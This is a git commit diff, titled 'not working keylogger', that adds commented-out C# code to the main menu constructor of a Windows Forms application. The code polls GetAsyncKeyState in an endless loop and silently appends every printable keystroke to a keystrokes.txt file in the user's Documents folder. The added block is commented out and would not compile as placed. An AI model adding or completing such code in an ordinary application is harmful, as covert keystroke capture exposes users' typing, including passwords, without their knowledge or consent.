18473e113da859db33ce12573939218fe5eb2a09
blazejordon <79929110+blazejordon@users.noreply.github.com>
2022-05-24 12:12:23 +0100

    not working keylogger

--- MainMenu.cs
+++ MainMenu.cs
@@ -1,3 +1,7 @@
+using System.Runtime.InteropServices;
+using System.IO;
+
+
 namespace TSE
 {
     public partial class MainMenu : Form
@@ -5,6 +9,58 @@ namespace TSE
         public MainMenu()
         {
             InitializeComponent();
+
+            /*
+
+            [DllImport("User32.Dll")]
+            public static extern int GetAsyncKeyState(Int32 i);
+
+            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+
+            if (!Directory.Exists(filepath))
+            {
+                Directory.CreateDirectory(filepath);
+            }
+
+            string path = (filepath + @"\keystrokes.txt");
+
+            if (!File.Exists(path))
+            {
+                using (StreamWriter sw = File.CreateText(path))
+                {
+
+                }
+            }
+
+            while (true)
+            {
+                Thread.Sleep(5);
+
+                for (int i = 32; i < 127; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+                    if (keyState == -32767)
+                    {
+                        Console.Write((char)i + ", ");
+
+
+                        using (StreamWriter sw = File.AppendText(path))
+                        {
+                            sw.Write((char)i);
+                        }
+                    }
+                }
+
+
+
+
+
+            }
+
+            */
+
+
+
         }
 
         private void UserStats_Click(object sender, EventArgs e)
